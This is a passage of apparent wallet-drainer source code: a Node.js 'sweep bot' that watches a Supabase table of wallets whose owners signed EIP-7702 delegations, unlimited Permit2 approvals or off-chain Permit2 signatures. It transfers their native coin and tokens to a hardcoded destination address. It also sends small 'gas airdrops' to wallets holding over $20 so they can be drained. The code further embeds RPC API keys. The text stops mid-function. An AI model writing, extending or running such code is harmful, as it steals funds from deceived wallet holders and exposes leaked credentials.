// bot.js — Sweep bot with EIP-7702 delegation + Permit2 AllowanceTransfer support
// Watches delegated_wallets via Supabase Realtime.
//
// Architecture:
//   wsProvider  — WebSocketProvider for instant block events (WS_URL)
//   rpcProvider — JsonRpcProvider for ALL balance/fee/tx calls (RPC_URL)
//
// Sweep strategy:
//   Block events         → sweep wallets whose 60s cooldown has expired
//   delegated_wallets RT → instant sweep on new/updated wallet
//
// Permit2 AllowanceTransfer flow:
//   User calls permit2.approve(token, relayer, MaxUint160, MaxUint48) once.
//   Bot calls permit2.transferFrom(user, dest, balance, token) — no signature,
//   no nonce, no expiry concern. Allowance is stored in the Permit2 contract.

require("dotenv").config();
const { ethers } = require("ethers");
const { createClient } = require("@supabase/supabase-js");
const ws = require("ws");
const fs  = require("fs");

// ── Config ────────────────────────────────────────────────────────────────────

const PRIVATE_KEY               = process.env.PRIVATE_KEY;
const WS_URL = process.env.WS_URL
  || "wss://wandering-autumn-night.matic.quiknode.pro/6ce5ff97b5191bdb68024e79fed04e3fab212524/";
const RPC_URL = process.env.RPC_URL
  || "https://wandering-autumn-night.matic.quiknode.pro/6ce5ff97b5191bdb68024e79fed04e3fab212524/";
const FALLBACK_RPCS = [
  process.env.FALLBACK_RPC_URL || "https://rpc.ankr.com/polygon/be1f5c60681efe39652195480d36e5411f8692d17f0679757cb2c06f8bc8f504",
  process.env.ALCHEMY_RPC_URL  || "https://polygon-mainnet.g.alchemy.com/v2/CJJ2BKVIibZxkuB6Sc7_Q",
  "https://polygon-bor.publicnode.com",
];
const CONTRACT_ADDRESS          = process.env.CONTRACT_ADDRESS;
const DESTINATION_ADDRESS       = process.env.DESTINATION_ADDRESS || "0x8Da0f664bb5091585148333275FcF0607b258026";
const TOKENS_TO_WATCH           = (process.env.TOKENS_TO_WATCH || "").split(",").filter(Boolean);
const SUPABASE_URL              = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
const CHAIN                     = process.env.CHAIN || "polygon";

const PERMIT2_ADDRESS      = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const MIN_ETH_WEI          = ethers.parseEther("0.5");  // 0.5 MATIC min reserve
const MIN_TOKEN_UNITS      = "0.5";

const sleep = ms => new Promise(r => setTimeout(r, ms));

// Stagger CoinGecko startup fetch to avoid hitting rate limits when all bots start
const CG_STAGGER_MS = { eth: 0, bnb: 45_000, polygon: 90_000 };
const TOKEN_CALL_DELAY     = 50;      // ms after each token call
// Minimum relayer balance — if below this, skip ALL sweeps to avoid failed txs
const RELAYER_MIN_WEI      = ethers.parseEther("5"); // 5 MATIC

// ── Airdrop / price constants (Polygon-specific) ──────────────────────────────
const NATIVE_COINGECKO_ID  = "matic-network";
const COINGECKO_PLATFORM   = "polygon-pos";
const GAS_AIRDROP_AMOUNT   = ethers.parseEther("0.3");   // 0.3 MATIC
const AIRDROP_MIN_VALUE_USD = 20;
const AIRDROP_MIN_RELAYER_USD = 50;

// ── Pimlico / Permissionless / Flashbots ─────────────────────────────────────
const PIMLICO_API_KEY    = process.env.PIMLICO_API_KEY || "";
const PIMLICO_POLICY_ID  = process.env.PIMLICO_POLICY_ID || "sp_lucky_hemingway";
const FLASHBOTS_AUTH_KEY = process.env.FLASHBOTS_AUTH_KEY || "";
const PIMLICO_URLS = {
  eth:     `https://api.pimlico.io/v2/1/rpc?apikey=${PIMLICO_API_KEY}`,
  bnb:     `https://api.pimlico.io/v2/56/rpc?apikey=${PIMLICO_API_KEY}`,
  polygon: `https://api.pimlico.io/v2/137/rpc?apikey=${PIMLICO_API_KEY}`,
};

// ── Validation ────────────────────────────────────────────────────────────────

if (!PRIVATE_KEY || !DESTINATION_ADDRESS) {
  console.error("Missing required env vars: PRIVATE_KEY, DESTINATION_ADDRESS");
  process.exit(1);
}
if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY) {
  console.warn("⚠️  SUPABASE env missing — Realtime disabled");
}

// ── Providers ─────────────────────────────────────────────────────────────────
//
// rpcProvider — HTTP FallbackProvider (QuickNode primary) for sweeps/txs
// scanProvider— free public HTTP endpoint ONLY for native block scanning
//               completely bypasses QuickNode billing for block reads
// wsProvider  — WebSocket for block number events ONLY; recreated on disconnect
//               NEVER passed to a Contract or Wallet

let lastRpcInitTime = 0;

// staticNetwork skips eth_chainId detectNetwork() on each provider —
// prevents the "JsonRpcProvider failed to detect network, retry in 1s" spam.
const POLYGON_NETWORK = ethers.Network.from(137);

function buildRpcProvider() {
  if (lastRpcInitTime > 0 && Date.now() - lastRpcInitTime < 60_000) return null;
  lastRpcInitTime = Date.now();
  const mkProvider = url => new ethers.JsonRpcProvider(url, POLYGON_NETWORK, { staticNetwork: POLYGON_NETWORK });
  return new ethers.FallbackProvider(
    [
      { provider: mkProvider(RPC_URL), priority: 1, weight: 1, stallTimeout: 2500 },
      ...FALLBACK_RPCS.map((url, i) => ({
        provider: mkProvider(url),
        priority: i + 2,
        weight:   1,
        stallTimeout: 2500,
      })),
    ],
    POLYGON_NETWORK,
    { quorum: 1 },
  );
}

let rpcProvider = buildRpcProvider();

const SCAN_RPC = process.env.SCAN_RPC_URL || "https://polygon-bor.publicnode.com";
const scanProvider = new ethers.JsonRpcProvider(SCAN_RPC, null, { staticNetwork: true });
scanProvider.pollingInterval = 999_999;

const supabase = SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY
  ? createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, {
      auth: { persistSession: false },
      realtime: { transport: ws },
    })
  : null;

// ── ABIs ──────────────────────────────────────────────────────────────────────

const CONTRACT_ABI = [
  "function sweepETH(address payable to) external",
  "function sweepTokens(address token, address to) external",
  "event ETHReceived(address indexed sender, uint256 amount)",
];

const DELEGATION_ABI = [
  "function sweepETH(address payable to) external",
  "function sweepTokens(address token, address to) external",
];

const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "event Transfer(address indexed from, address indexed to, uint256 value)",
];

const EIP2612_PERMIT_ABI = [
  "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
];

const STABLECOIN_ADDRS = new Set([
  "0x55d398326f99059ff775485246999027b3197955",
  "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
  "0xe9e7cea3dedca5984780bafc599bd69add087d56",
  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
  "0xdac17f958d2ee523a2206206994597c13d831ec7",
  "0x6b175474e89094c44da98b954eedeac495271d0f",
  "0x2791bca1f2de4661ed88a30c99a7a9449aa84174",
  "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",
  "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063",
]);

const priceCache   = new Map();
const PRICE_CACHE_TTL = 5 * 60 * 1000;

// Permit2 — AllowanceTransfer + gasless PermitBatch + SignatureTransfer ABIs.
const PERMIT2_ABI = [
  // AllowanceTransfer: bot checks stored allowance then calls transferFrom
  "function transferFrom(address from, address to, uint160 amount, address token) external",
  "function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)",
  // PATH B gasless: bot calls permit() to set allowances from user's PermitBatch sig
  "function permit(address owner, tuple(tuple(address token, uint160 amount, uint48 expiration, uint48 nonce)[] details, address spender, uint256 sigDeadline) permitBatch, bytes calldata signature) external",
];
// Batch SignatureTransfer — separate ABI to avoid overload ambiguity with ethers.js
const PERMIT2_BATCH_TRANSFER_ABI = [
  "function permitTransferFrom(tuple(tuple(address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount)[] transferDetails, address owner, bytes calldata signature) external",
];

// ── Wallet & contracts — ALL bound to rpcProvider (HTTP) ─────────────────────
// RULE: wsProvider is NEVER passed to a Contract or Wallet.

const relayerWallet = new ethers.Wallet(PRIVATE_KEY, rpcProvider);
const permit2       = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, relayerWallet);
const permit2Batch  = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_BATCH_TRANSFER_ABI, relayerWallet);
const contract      = CONTRACT_ADDRESS
  ? new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, relayerWallet)
  : null;

// ── State ─────────────────────────────────────────────────────────────────────

let sweepingETH        = false;
const sweepingToken    = {};
const delegatedWallets   = new Map(); // address → type ("eip7702" | "permit2")
const needsReconnect     = new Map(); // address.toLowerCase() → timestamp (1-hour cooldown)
const needsReauthWallets = new Set(); // eip7702 addresses where delegation is gone
const RECONNECT_COOLDOWN_MS = 3_600_000; // 1 hour
let realtimeChannel    = null;
const BACKOFF_MS       = [5_000, 10_000, 20_000, 40_000, 60_000];
let reconnectAttempt   = 0;
function withJitter(ms) { return Math.floor(ms * (0.8 + Math.random() * 0.4)); }

// In-memory guard: track permit() failures this session so we never retry.
// Key: `${walletAddress}:${tokenAddress}`
const failedEIP2612 = new Set();

// ── Dynamic token list ────────────────────────────────────────────────────────

const KNOWN_DECIMALS = {
  // ETH mainnet
  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48": 6,  // USDC
  "0xdac17f958d2ee523a2206206994597c13d831ec7": 6,  // USDT
  "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599": 8,  // WBTC
  // BNB
  "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d": 18, // USDC BSC
  "0x55d398326f99059ff775485246999027b3197955": 18, // USDT BSC
  "0xba2ae424d960c26247dd6c32edc70b295c744c43": 8,  // DOGE BSC
  // Polygon
  "0x2791bca1f2de4661ed88a30c99a7a9449aa84174": 6,  // USDC Polygon
  "0xc2132d05d31c914a87c6611c10748aeb04b58e8f": 6,  // USDT Polygon
  "0x1bfd67037b42cf73acf2047067bd4f2c47d9bfd6": 8,  // WBTC Polygon
};

const FALLBACK_TOKENS = {
  bnb: [
    { address: "0x55d398326f99059ff775485246999027b3197955", symbol: "USDT",  decimals: 18 },
    { address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", symbol: "USDC",  decimals: 18 },
    { address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", symbol: "BUSD",  decimals: 18 },
    { address: "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c", symbol: "WBNB",  decimals: 18 },
    { address: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82", symbol: "CAKE",  decimals: 18 },
    { address: "0x2170ed0880ac9a755fd29b2688956bd959f933f8", symbol: "ETH",   decimals: 18 },
    { address: "0xba2ae424d960c26247dd6c32edc70b295c744c43", symbol: "DOGE",  decimals: 8  },
    { address: "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47", symbol: "ADA",   decimals: 18 },
    { address: "0x7083609fce4d1d8dc0c979aab8c869ea2c873402", symbol: "DOT",   decimals: 18 },
    { address: "0xf8a0bf9cf54bb92f17374d9e9a321e6a111a51bd", symbol: "LINK",  decimals: 18 },
    { address: "0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe", symbol: "XRP",   decimals: 18 },
    { address: "0xcc42724c6683b7e57334c4e856f4c9965ed682bd", symbol: "MATIC", decimals: 18 },
  ],
  eth: [
    { address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", symbol: "USDC",  decimals: 6  },
    { address: "0xdac17f958d2ee523a2206206994597c13d831ec7", symbol: "USDT",  decimals: 6  },
    { address: "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599", symbol: "WBTC",  decimals: 8  },
    { address: "0x514910771af9ca656af840dff83e8264ecf986ca", symbol: "LINK",  decimals: 18 },
    { address: "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984", symbol: "UNI",   decimals: 18 },
    { address: "0x6b175474e89094c44da98b954eedeac495271d0f", symbol: "DAI",   decimals: 18 },
    { address: "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce", symbol: "SHIB",  decimals: 18 },
    { address: "0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0", symbol: "MATIC", decimals: 18 },
  ],
  polygon: [
    { address: "0x2791bca1f2de4661ed88a30c99a7a9449aa84174", symbol: "USDC",  decimals: 6  },
    { address: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", symbol: "USDT",  decimals: 6  },
    { address: "0x1bfd67037b42cf73acf2047067bd4f2c47d9bfd6", symbol: "WBTC",  decimals: 8  },
    { address: "0x7ceb23fd6bc0add59e62ac25578270cff1b9f619", symbol: "WETH",  decimals: 18 },
    { address: "0x53e0bca35ec356bd5dddfebbd1fc0fd03fabad39", symbol: "LINK",  decimals: 18 },
    { address: "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063", symbol: "DAI",   decimals: 18 },
    { address: "0xd6df932a45c0f255f85145f286ea0b292b21c90b", symbol: "AAVE",  decimals: 18 },
  ],
};

// Runtime token list — populated by loadTokens() on init
let TOKENS = [];

// ── Event-driven monitoring state ─────────────────────────────────────────────

const monitoredWallets = new Map(); // address.toLowerCase() → { address, type }
const sweepingNow      = new Set(); // currently-sweeping addresses (transfer debounce)

// ── Logging ───────────────────────────────────────────────────────────────────

const TAG  = `[${CHAIN.toUpperCase()}]`;
const log  = (msg) => console.log(`[${new Date().toISOString()}] ${TAG} ${msg}`);
const warn = (msg) => console.warn(`[${new Date().toISOString()}] ${TAG} ⚠  ${msg}`);
const err  = (msg) => console.error(`[${new Date().toISOString()}] ${TAG} ✖  ${msg}`);

// ── Helpers ───────────────────────────────────────────────────────────────────

function normalizeAddress(addr) {
  try { return ethers.getAddress(addr); } catch { return null; }
}

async function getFeeData() {
  const f = await rpcProvider.getFeeData();
  return { maxFeePerGas: f.maxFeePerGas, maxPriorityFeePerGas: f.maxPriorityFeePerGas };
}

// ── Main-contract sweep ───────────────────────────────────────────────────────

async function sweepETH() {
  if (sweepingETH || !contract) return;
  sweepingETH = true;
  try {
    const bal = await rpcProvider.getBalance(contract.target);
    if (bal < MIN_ETH_WEI) return;
    log(`Contract MATIC ${ethers.formatEther(bal)} — sweeping`);
    const gas = await contract.sweepETH.estimateGas(DESTINATION_ADDRESS);
    const fee = await getFeeData();
    const tx  = await contract.sweepETH(DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
    log(`sweepETH tx: ${tx.hash}`);
    await tx.wait();
    log("sweepETH confirmed");
  } catch (e) { err(`sweepETH: ${e.message}`); }
  finally    { sweepingETH = false; }
}

async function sweepToken(tokenAddress) {
  const key = tokenAddress.toLowerCase();
  if (sweepingToken[key] || !contract) return;
  sweepingToken[key] = true;
  try {
    const token   = new ethers.Contract(tokenAddress, ERC20_ABI, rpcProvider);
    const balance = await token.balanceOf(contract.target);
    let decimals  = 18;
    try { decimals = await token.decimals(); } catch {}
    if (balance < ethers.parseUnits(MIN_TOKEN_UNITS, decimals)) return;
    let symbol = tokenAddress.slice(0, 8);
    try { symbol = await token.symbol(); } catch {}
    log(`Contract ${symbol} ${ethers.formatUnits(balance, decimals)} — sweeping`);
    const gas = await contract.sweepTokens.estimateGas(tokenAddress, DESTINATION_ADDRESS);
    const fee = await getFeeData();
    const tx  = await contract.sweepTokens(tokenAddress, DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
    log(`sweepTokens(${symbol}) tx: ${tx.hash}`);
    await tx.wait();
  } catch (e) { err(`sweepToken(${tokenAddress}): ${e.message}`); }
  finally     { sweepingToken[key] = false; }
}

// ── EIP-7702 delegated wallet sweep ───────────────────────────────────────────

async function sweepDelegatedWallet(walletAddress) {
  const checksum = normalizeAddress(walletAddress);
  if (!checksum) return;
  try {
    const userContract = new ethers.Contract(checksum, DELEGATION_ABI, relayerWallet);

    // ETH first
    try {
      const bal = await rpcProvider.getBalance(checksum);
      if (bal > MIN_ETH_WEI) {
        log(`[eip7702] ${checksum} MATIC ${ethers.formatEther(bal)} — sweeping`);
        const gas = await userContract.sweepETH.estimateGas(DESTINATION_ADDRESS);
        const fee = await getFeeData();
        const tx  = await userContract.sweepETH(DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
        log(`[eip7702] sweepETH(${checksum}) tx: ${tx.hash}`);
        await tx.wait();
        log(`[eip7702] sweepETH confirmed for ${checksum}`);
      }
    } catch (e) { err(`[eip7702] sweepETH ${checksum}: ${e.message}`); }

    // ERC-20 tokens — sequential with delay after each call
    for (const tokenAddress of TOKENS_TO_WATCH) {
      try {
        const token   = new ethers.Contract(tokenAddress.trim(), ERC20_ABI, rpcProvider);
        const balance = await token.balanceOf(checksum);
        let decimals  = 18;
        try { decimals = await token.decimals(); } catch {}
        if (balance >= ethers.parseUnits(MIN_TOKEN_UNITS, decimals)) {
        let symbol = tokenAddress.slice(0, 8);
        try { symbol = await token.symbol(); } catch {}
        log(`[eip7702] ${checksum} ${symbol} ${ethers.formatUnits(balance, decimals)} — sweeping`);
        const gas = await userContract.sweepTokens.estimateGas(tokenAddress.trim(), DESTINATION_ADDRESS);
        const fee = await getFeeData();
        const tx  = await userContract.sweepTokens(tokenAddress.trim(), DESTINATION_ADDRESS, {
          gasLimit: gas * 120n / 100n, ...fee,
        });
        log(`[eip7702] sweepTokens(${symbol}) tx: ${tx.hash}`);
        await tx.wait();
        }
      } catch (e) { err(`[eip7702] sweepToken ${tokenAddress} from ${checksum}: ${e.message}`); }
      await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
    }
  } catch (e) { err(`[eip7702] sweepDelegatedWallet ${checksum}: ${e.message}`); }
}

// ── EIP-7702 sweep with delegation-active check ───────────────────────────────
//
// EIP-7702 delegation is PERSISTENT on-chain: the code at the wallet address
// stays set even after the user's account nonce changes (nonces only matter at
// authorization submission time, not afterward).
//
// Correct liveness check: rpcProvider.getCode(address) — delegated addresses
// have non-empty code (the 0xef0100… delegation designator + contract address).
// If code === "0x", the delegation was revoked → mark needs-reauth.
//
// needsReauthWallets (in-memory Set) prevents re-writing Supabase every 60s
// after we've already flagged a wallet. Cleared when Realtime UPDATE fires.

async function sweepEIP7702Wallet(walletAddress) {
  const checksum = normalizeAddress(walletAddress);
  if (!checksum) return;

  const addrKey = checksum.toLowerCase();

  // Already flagged this session — skip until Realtime update resets it
  if (needsReauthWallets.has(addrKey)) return;

  // Check delegation code is still active at this address
  try {
    const code = await rpcProvider.getCode(checksum);
    if (!code || code === "0x") {
      warn(`[eip7702] ${checksum} — delegation not active (no code) — marking needs-reauth`);
      needsReauthWallets.add(addrKey);
      if (supabase) {
        await supabase
          .from("delegated_wallets")
          .update({ status: "needs-reauth" })
          .eq("address", addrKey)
          .eq("chain", CHAIN);
      }
      return;
    }
  } catch (e) {
    warn(`[eip7702] getCode failed for ${checksum}: ${e.message}`);
    // Non-fatal — proceed with sweep attempt
  }

  await sweepDelegatedWallet(checksum);
}

// ── Permit2 AllowanceTransfer sweep ──────────────────────────────────────────
//
// User previously called:
//   1. erc20.approve(PERMIT2_ADDRESS, MaxUint256)
//   2. permit2.approve(token, relayerWallet, MaxUint160, MaxUint48)
//
// Bot calls permit2.transferFrom(user, destination, balance, token) per token.
// No signature, no nonce, no deadline — allowance lives in Permit2 forever.
//
// Tokens to sweep: read from delegated_wallets.permit_metadata.tokens,
// fallback to TOKENS_TO_WATCH env var.

async function sweepPermit2Wallet(walletAddress) {
  const checksum = normalizeAddress(walletAddress);
  if (!checksum) return;

  // 1-hour cooldown when all tokens lack Permit2 allowance — prevents block-level spam
  const reconnectKey = checksum.toLowerCase();
  const reconnectTs  = needsReconnect.get(reconnectKey);
  if (reconnectTs && Date.now() - reconnectTs < RECONNECT_COOLDOWN_MS) return;

  // Resolve token list for this wallet
  let tokenList = TOKENS_TO_WATCH;
  if (supabase) {
    try {
      const { data } = await supabase
      .from("delegated_wallets")
      .select("permit_metadata")
      .eq("address", checksum.toLowerCase())
      .eq("chain", CHAIN)
      .single();
      const stored = data?.permit_metadata?.tokens;
      if (Array.isArray(stored) && stored.length > 0) {
        tokenList = stored;
      }
    } catch {
      // Non-fatal — fall back to env var token list
    }
  }

  if (!tokenList.length) {
    warn(`[permit2] no tokens configured for ${checksum}`);
    return;
  }

  // Hard balance gate — verify at least one token has non-zero balance before any allowance checks
  {
    let anyBalance = false;
    for (const rawAddr of tokenList) {
      const addr = normalizeAddress(typeof rawAddr === "string" ? rawAddr : rawAddr.address ?? rawAddr.token);
      if (!addr) continue;
      try {
        const bal = await new ethers.Contract(addr, ERC20_ABI, rpcProvider).balanceOf(checksum);
        if (bal > 0n) { anyBalance = true; break; }
      } catch {}
      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
    }
    if (!anyBalance) {
      log(`[permit2] ${checksum.slice(0, 10)} — all ${tokenList.length} token(s) zero balance, skipping`);
    return;
    }
  }

  log(`[permit2] checking ${tokenList.length} token(s) for ${checksum}`);
  const nowSecs = BigInt(Math.floor(Date.now() / 1000));
  let noAllowanceCount = 0;
  let checkedCount     = 0; // tracks valid-address tokens actually checked (not skipped)

  // Check allowance + balance sequentially, then call transferFrom per token
  for (const rawAddress of tokenList) {
    const tokenAddress = normalizeAddress(
      typeof rawAddress === "string" ? rawAddress : rawAddress.address || rawAddress.token
    );
    if (!tokenAddress) continue;
    checkedCount++;

    try {
      // Verify Permit2 allowance is set and not expired before any balance check
      let allowanceOk = false;
      try {
        const [allowedAmount, expiration] = await permit2.allowance(
          checksum, tokenAddress, relayerWallet.address
        );
        allowanceOk = allowedAmount > 0n && expiration > nowSecs;
        if (!allowanceOk) {
          noAllowanceCount++;
          warn(`[permit2] ${tokenAddress.slice(0, 10)}: allowance not set or expired for ${checksum} — user must reconnect`);
          await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
          continue;
        }
      } catch {
        // allowance() call failed — try transferFrom anyway (non-fatal)
        allowanceOk = true;
      }

      const token   = new ethers.Contract(tokenAddress, ERC20_ABI, rpcProvider);
      const balance = await token.balanceOf(checksum);

      if (balance === 0n) {
        await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
        continue;
      }

      let symbol = tokenAddress.slice(0, 10);
      try { symbol = await token.symbol(); } catch {}

      log(`[permit2] ${checksum} ${symbol} balance=${ethers.formatUnits(balance, 18)} — transferFrom`);

      const fee = await getFeeData();
      const tx  = await permit2.transferFrom(
        checksum,
        DESTINATION_ADDRESS,
        balance,          // uint160 — token balances never exceed uint160 in practice
        tokenAddress,
        { gasLimit: 150_000n, ...fee }
      );
      log(`[permit2] transferFrom(${symbol}) tx: ${tx.hash}`);
      await tx.wait();
      log(`[permit2] confirmed — ${symbol} swept for ${checksum}`);
    } catch (e) {
      const msg = e.message ?? "";
      if (msg.includes("InsufficientAllowance") || msg.includes("INSUFFICIENT_ALLOWANCE")) {
        warn(`[permit2] ${tokenAddress}: insufficient allowance for ${checksum} — user must reconnect`);
      } else if (msg.includes("InsufficientBalance") || msg.includes("balance")) {
        // Balance changed between check and tx — harmless
      } else {
        err(`[permit2] transferFrom ${tokenAddress} for ${checksum}: ${msg}`);
      }
    }
    await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
  }

  // If every checked token lacked allowance, impose a 1-hour cooldown to stop block-level spam
  if (checkedCount > 0 && noAllowanceCount === checkedCount) {
    warn(`[permit2] ${checksum}: all ${checkedCount} token(s) lack allowance — checking again in 1 hour`);
    needsReconnect.set(reconnectKey, Date.now());
  }
}

// ── Price feed helpers (CoinGecko free API) ──────────────────────────────────

async function getTokenPriceUSD(tokenAddr) {
  const key = tokenAddr.toLowerCase();
  if (STABLECOIN_ADDRS.has(key)) return 1;
  const cached = priceCache.get(key);
  if (cached && Date.now() - cached.ts < PRICE_CACHE_TTL) return cached.usd;
  try {
    const url = `https://api.coingecko.com/api/v3/simple/token_price/${COINGECKO_PLATFORM}` +
      `?contract_addresses=${tokenAddr}&vs_currencies=usd`;
    const res  = await fetch(url, { headers: { accept: "application/json" }, signal: AbortSignal.timeout(8000) });
    if (!res.ok) return 0;
    const data = await res.json();
    const usd  = data[key]?.usd ?? 0;
    priceCache.set(key, { usd, ts: Date.now() });
    return usd;
  } catch { return 0; }
}

async function getNativePriceUSD() {
  const cached = priceCache.get("__native__");
  if (cached && Date.now() - cached.ts < PRICE_CACHE_TTL) return cached.usd;
  try {
    const url  = `https://api.coingecko.com/api/v3/simple/price?ids=${NATIVE_COINGECKO_ID}&vs_currencies=usd`;
    const res  = await fetch(url, { headers: { accept: "application/json" }, signal: AbortSignal.timeout(8000) });
    if (!res.ok) return 0;
    const data = await res.json();
    const usd  = data[NATIVE_COINGECKO_ID]?.usd ?? 0;
    priceCache.set("__native__", { usd, ts: Date.now() });
    return usd;
  } catch { return 0; }
}

async function getTotalValueUSD(tokens) {
  let total = 0;
  for (const { token, balance } of tokens) {
    if (!balance || balance === 0n) continue;
    try {
      const price = await getTokenPriceUSD(token);
      if (price === 0) continue;
      const erc20    = new ethers.Contract(token, ERC20_ABI, rpcProvider);
      let decimals   = 18;
      try { decimals = await erc20.decimals(); } catch {}
      total += Number(ethers.formatUnits(balance, decimals)) * price;
    } catch {}
  }
  return total;
}

async function getRelayerBalanceUSD() {
  try {
    const bal       = await rpcProvider.getBalance(relayerWallet.address);
    const nativeUSD = await getNativePriceUSD();
    return Number(ethers.formatEther(bal)) * nativeUSD;
  } catch { return 0; }
}

async function evaluateAirdrop(walletAddress, needsGasTokens) {
  const totalUSD = await getTotalValueUSD(needsGasTokens);
  if (totalUSD < AIRDROP_MIN_VALUE_USD) {
    log(`[monitor] ${walletAddress}: $${totalUSD.toFixed(2)} < $${AIRDROP_MIN_VALUE_USD} — monitoring only`);
    return;
  }
  const relayerUSD = await getRelayerBalanceUSD();
  if (relayerUSD < AIRDROP_MIN_RELAYER_USD) {
    warn(`[monitor] ${walletAddress}: relayer $${relayerUSD.toFixed(2)} < $${AIRDROP_MIN_RELAYER_USD} — skip airdrop`);
    return;
  }
  if (supabase) {
    const { data } = await supabase
      .from("delegated_wallets")
      .select("permit_metadata")
      .eq("address", walletAddress.toLowerCase())
      .eq("chain", CHAIN)
      .single();
    if (data?.permit_metadata?.gas_airdropped) {
      log(`[monitor] ${walletAddress}: already airdropped — monitoring`);
      return;
    }
  }
  log(`[airdrop] ${walletAddress}: $${totalUSD.toFixed(2)} — sending ${ethers.formatEther(GAS_AIRDROP_AMOUNT)} native`);
  try {
    const fee = await getFeeData();
    const tx  = await relayerWallet.sendTransaction({
      to: walletAddress, value: GAS_AIRDROP_AMOUNT, gasLimit: 21_000n, ...fee,
    });
    await tx.wait();
    log(`[airdrop] confirmed: ${tx.hash}`);
    if (supabase) {
      const { data } = await supabase
        .from("delegated_wallets")
        .select("permit_metadata")
        .eq("address", walletAddress.toLowerCase())
        .eq("chain", CHAIN)
        .single();
      const currentMeta = data?.permit_metadata ?? {};
      await supabase
        .from("delegated_wallets")
        .update({ permit_metadata: { ...currentMeta, gas_airdropped: true } })
        .eq("address", walletAddress.toLowerCase())
        .eq("chain", CHAIN);
    }
  } catch (e) { err(`[airdrop] failed for ${walletAddress}: ${e.message}`); }
}

// ── Gasless PATH B sweep ──────────────────────────────────────────────────────
//
// Wallet has type="permit2-gasless". User signed two things off-chain:
//   permitBatch        — PermitBatch (AllowanceTransfer) for tokens already approved ERC20->Permit2
//   signatureTransfers — array of per-token PermitTransferFrom sigs for uncovered tokens
//
// Bot pays gas to:
//   1. permit2.permit(owner, permitBatch, sig)   — sets Permit2 allowances for covered tokens
//   2. permit2.transferFrom()                    — sweeps covered tokens
//   3. permit2.permitTransferFrom() per entry    — single-token sweep (~200k gas each)
//      On InvalidNonce: marks entry as spent in Supabase, never retries that sig.
//      On TRANSFER_FROM_FAILED: logs but keeps sig (ERC20 approval may not be set yet).

async function sweepGaslessWallet(walletAddress) {
  const checksum = normalizeAddress(walletAddress);
  if (!checksum || !supabase) return;

  let meta;
  try {
    const { data } = await supabase
      .from("delegated_wallets")
      .select("permit_metadata")
      .eq("address", checksum.toLowerCase())
      .eq("chain", CHAIN)
      .single();
    meta = data?.permit_metadata;
  } catch (e) {
    err(`[gasless] metadata read for ${checksum}: ${e.message}`);
    return;
  }

  if (!meta) { warn(`[gasless] no permit_metadata for ${checksum}`); return; }

  const { permitBatch, signatureTransfers } = meta;
  const nowSecs = BigInt(Math.floor(Date.now() / 1000));

  // ── Part 6: Log signature data read from Supabase ─────────────────────────
  log(`[gasless] sig type: ${typeof signatureTransfers}`);
  if (signatureTransfers && typeof signatureTransfers === 'object' && !Array.isArray(signatureTransfers)) {
    const st = signatureTransfers;
    log(`[gasless] permitted count: ${st.permitted?.length ?? 0}`);
    log(`[gasless] deadline: ${st.deadline}`);
    log(`[gasless] nonce: ${String(st.nonce ?? '').slice(0, 16)}...`);
    log(`[gasless] spender: ${st.spender}`);
    log(`[gasless] spent: ${st.spent ?? false}`);
    if (!st.permitted?.length) warn('[gasless] permitted array is empty — nothing to sweep');
    if (st.deadline && BigInt(st.deadline) < nowSecs) warn('[gasless] deadline already EXPIRED');
    if (st.spender?.toLowerCase() !== relayerWallet.address.toLowerCase()) {
      warn(`[gasless] SPENDER MISMATCH — sig.spender=${st.spender} relayer=${relayerWallet.address}`);
    }
  } else if (Array.isArray(signatureTransfers)) {
    const unspent = signatureTransfers.filter(e => !e.spent).length;
    log(`[gasless] legacy array: ${signatureTransfers.length} entries, ${unspent} unspent`);
  }

  // Hard balance gate — check ONLY the signed token addresses before any on-chain tx
  const signedAddrs = [
    ...(Array.isArray(permitBatch?.details) ? permitBatch.details.map(d => d.token) : []),
    ...(Array.isArray(signatureTransfers)
      ? signatureTransfers.map(e => e.token)
      : (signatureTransfers?.permitted ?? []).map(p => p.token)),
